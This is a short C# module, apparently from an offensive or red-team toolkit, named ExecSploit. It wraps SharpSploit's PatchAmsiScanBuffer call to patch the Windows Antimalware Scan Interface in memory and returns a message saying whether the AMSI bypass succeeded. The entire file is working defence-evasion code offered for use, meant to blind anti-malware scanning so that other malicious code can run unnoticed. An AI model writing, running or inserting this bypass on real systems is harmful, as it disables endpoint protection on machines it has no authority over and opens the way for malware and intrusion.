using System;

using SharpSploit.Evasion;

namespace ExecSploit
{
    public static class BypassAmsi
    {
        public static string Execute()
        {
            try
            {
                if (Amsi.PatchAmsiScanBuffer())
                {
                    return "Amsi Bypass Succeeded.";
                }
                else
                {
                    return "Amsi Bypass Failed.";
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}